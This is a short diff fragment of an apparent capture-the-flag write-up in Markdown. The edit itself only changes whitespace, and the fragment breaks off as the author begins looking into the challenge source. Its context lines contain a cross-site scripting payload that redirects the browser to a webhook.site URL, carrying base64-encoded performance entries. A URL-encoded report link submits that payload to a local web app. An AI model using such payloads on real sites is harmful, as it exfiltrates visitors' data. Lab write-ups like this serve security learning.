@@ -6,7 +6,7 @@ window.location.assign("https://webhook.site/3c763848-b83f-415d-b837-807111679f9
 report: http://web:3000/?xss=window.location.assign%28%22https%3A%2F%2Fwebhook.site%2F3c763848-b83f-415d-b837-807111679f92%3Fa%3D%22%20%2B%20btoa%28JSON.stringify%28window.performance.getEntries%28%29%29%29%29%3B  
 ![image](https://github.com/user-attachments/assets/4eba27b3-f6b3-46da-9360-e08af0322588)
 ## so how is work
-look into source:
+look into source:  
 ![image](https://github.com/user-attachments/assets/5bdcbca4-0f80-4a54-9995-939eae804117)
 
 we have 2 folder  
